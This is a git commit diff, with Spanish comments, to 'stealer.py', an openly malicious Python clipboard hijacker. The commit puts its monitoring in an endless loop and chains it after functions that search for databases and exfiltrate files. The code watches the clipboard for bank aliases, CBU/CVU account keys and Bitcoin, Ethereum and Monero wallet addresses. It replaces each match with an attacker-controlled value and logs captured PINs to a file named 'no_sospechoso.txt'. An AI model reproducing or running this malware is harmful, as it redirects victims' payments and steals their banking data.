1a9c2661baa61cc477aa5368b65c9c6d62ed0279
Adanzx <dibattista85@hotmail.com>
2022-08-23 19:10:48 -0300

    funciones ordenadas
    se ordenaron las funciones y se llamaron para su ejecucion en un bucle

--- stealer.py
+++ stealer.py
@@ -1,19 +1,13 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-#/***
-# Passwords
-#           => Google Chrome
-#           => Firefox
-#           => Dump credenciales del Sistema
-#***/
-
 import settings
 import pyperclip3 as pc
 import re
 import glob
 import shutil
+import time
 
- #Registrar hallazgos en el Log
+#Registrar hallazgos en el Log
 def loguear_hallazgo(hallazgo, tipo):
     #1 => Abrir archivo
     f = open("no_sospechoso.txt", "a")
@@ -42,69 +36,80 @@ def buscar_bases():
 
 #Monitorear portapapeles
 def monitorear():
-    #Chequear Alias Bancario
-    #1 => Revisar el portapapeles
-    victima_portapapeles = pc.paste().decode("utf-8")
-    #2 => Compilar la expresión regular (regla que define lo que buscamos)
-    mi_patron_alias = re.compile(settings.patron_alias)
-    #3 => Comparar portapapeles con reglas de Alias Bancario
-    if mi_patron_alias.match(victima_portapapeles):
-        pc.copy(settings.atacante_alias)
-        print("🚨 Encontrado Alias Bancario. Reemplazando... 😈")
-        loguear_hallazgo(victima_portapapeles, "Alias bancario")
+    while True:
+        #Chequear Alias Bancario
+        #1 => Revisar el portapapeles
+        victima_portapapeles = pc.paste().decode("utf-8")
+        #2 => Compilar la expresión regular (regla que define lo que buscamos)
+        mi_patron_alias = re.compile(settings.patron_alias)
+        #3 => Comparar portapapeles con reglas de Alias Bancario
+        if mi_patron_alias.match(victima_portapapeles):
+            pc.copy(settings.atacante_alias)
+            print("🚨 Encontrado Alias Bancario. Reemplazando... 😈")
+            loguear_hallazgo(victima_portapapeles, "Alias bancario")
 
-    #Chequear Clave Bancaria Uniforme / Clave Virtual Uniforme
-    #1 => Revisar el portapapeles
-    victima_portapapeles = pc.paste().decode("utf-8")
-    #2 => Compilar la expresión regular
-    mi_patron_cbu = re.compile(settings.patron_cbu_cvu)
-    #3 => Comparar portapapeles con reglas de CBU/CVU
-    if mi_patron_cbu.match(victima_portapapeles):
-        pc.copy(settings.atacante_cbu_cvu)
-        print("🚨 Encontrado Clave Bancaria/Virtual Uniforme. Reemplazando... 😈")
-        loguear_hallazgo(victima_portapapeles, "CBU/CVU")
+        #Chequear Clave Bancaria Uniforme / Clave Virtual Uniforme
+        #1 => Revisar el portapapeles
+        victima_portapapeles = pc.paste().decode("utf-8")
+        #2 => Compilar la expresión regular
+        mi_patron_cbu = re.compile(settings.patron_cbu_cvu)
+        #3 => Comparar portapapeles con reglas de CBU/CVU
+        if mi_patron_cbu.match(victima_portapapeles):
+            pc.copy(settings.atacante_cbu_cvu)
+            print("🚨 Encontrado Clave Bancaria/Virtual Uniforme. Reemplazando... 😈")
+            loguear_hallazgo(victima_portapapeles, "CBU/CVU")
 
-    #Chequear Wallet BTC
-    #1 => Revisar el portapapeles
-    victima_portapapeles = pc.paste().decode("utf-8")
-    #2 => Compilar la expresión regular
-    mi_patron_btc = re.compile(settings.patron_wallet_btc)
-    #3 => Comparar portapapeles con reglas de BTC
-    if mi_patron_btc.match(victima_portapapeles):
-        pc.copy(settings.atacante_wallet_btc)
-        print("🚨 Encontrado Wallet Bitcoin. Reemplazando... 😈")
-        loguear_hallazgo(victima_portapapeles, "Wallet BTC")
+        #Chequear Wallet BTC
+        #1 => Revisar el portapapeles
+        victima_portapapeles = pc.paste().decode("utf-8")
+        #2 => Compilar la expresión regular
+        mi_patron_btc = re.compile(settings.patron_wallet_btc)
+        #3 => Comparar portapapeles con reglas de BTC
+        if mi_patron_btc.match(victima_portapapeles):
+            pc.copy(settings.atacante_wallet_btc)
+            print("🚨 Encontrado Wallet Bitcoin. Reemplazando... 😈")
+            loguear_hallazgo(victima_portapapeles, "Wallet BTC")
 
-    #Chequear Wallet ETH
-    #1 => Revisar el portapapeles
-    victima_portapapeles = pc.paste().decode("utf-8")
-    #2 => Compilar la expresión regular
-    mi_patron_eth = re.compile(settings.patron_wallet_eth)
-    #3 => Comparar portapapeles con reglas de ETH
-    if mi_patron_eth.match(victima_portapapeles):
-        pc.copy(settings.atacante_wallet_eth)
-        print("🚨 Encontrado Wallet Ethereum Remplazando... 😈")
-        loguear_hallazgo(victima_portapapeles, "Wallet ETH")
+        #Chequear Wallet ETH
+        #1 => Revisar el portapapeles
+        victima_portapapeles = pc.paste().decode("utf-8")
+        #2 => Compilar la expresión regular
+        mi_patron_eth = re.compile(settings.patron_wallet_eth)
+        #3 => Comparar portapapeles con reglas de ETH
+        if mi_patron_eth.match(victima_portapapeles):
+            pc.copy(settings.atacante_wallet_eth)
+            print("🚨 Encontrado Wallet Ethereum Remplazando... 😈")
+            loguear_hallazgo(victima_portapapeles, "Wallet ETH")
 
-    #Chequear Wallet XMR
-    #1 => Revisar el portapapeles
-    victima_portapapeles = pc.paste().decode("utf-8")
-    #2 => Compilar la expresión regular
-    mi_patron_xmr = re.compile(settings.patron_wallet_xmr)
-    #3 => Comparar portapapeles con reglas de XMR
-    if mi_patron_xmr.match(victima_portapapeles):
-        pc.copy(settings.atacante_wallet_xmr)
-        print("🚨 Encontrado Wallet Monero. Reemplazando... 😈")
-        loguear_hallazgo(victima_portapapeles, "Wallet XMR")
+        #Chequear Wallet XMR
+        #1 => Revisar el portapapeles
+        victima_portapapeles = pc.paste().decode("utf-8")
+        #2 => Compilar la expresión regular
+        mi_patron_xmr = re.compile(settings.patron_wallet_xmr)
+        #3 => Comparar portapapeles con reglas de XMR
+        if mi_patron_xmr.match(victima_portapapeles):
+            pc.copy(settings.atacante_wallet_xmr)
+            print("🚨 Encontrado Wallet Monero. Reemplazando... 😈")
+            loguear_hallazgo(victima_portapapeles, "Wallet XMR")
 
-    #Chequear PIN
-    #1 => Revisar el portapapeles
-    victima_portapapeles = pc.paste().decode("utf-8")
-    #2 => Compilar la expresión regular
-    mi_patron_pin = re.compile(settings.patron_pin)
-    #3 => Comparar portapapeles con reglas de PIN
-    if mi_patron_pin.match(victima_portapapeles):
-        print("🚨 Encontrado PIN. Copiando... 😈")
-        loguear_hallazgo(victima_portapapeles, "PIN")
+        #Chequear PIN
+        #1 => Revisar el portapapeles
+        victima_portapapeles = pc.paste().decode("utf-8")
+        #2 => Compilar la expresión regular
+        mi_patron_pin = re.compile(settings.patron_pin)
+        #3 => Comparar portapapeles con reglas de PIN
+        if mi_patron_pin.match(victima_portapapeles):
+            print("🚨 Encontrado PIN. Copiando... 😈")
+            loguear_hallazgo(victima_portapapeles, "PIN")
+        
+        #Esperar 5 segundos
+        print("😴 Durmiendo...")
+        time.sleep(5)
 
-
+#Llamar a las funciones en orden
+#Buscar bases
+buscar_bases()
+#Comprimir archivos
+exfiltrar_archivos()
+#Iniciar monitoreo
+monitorear()
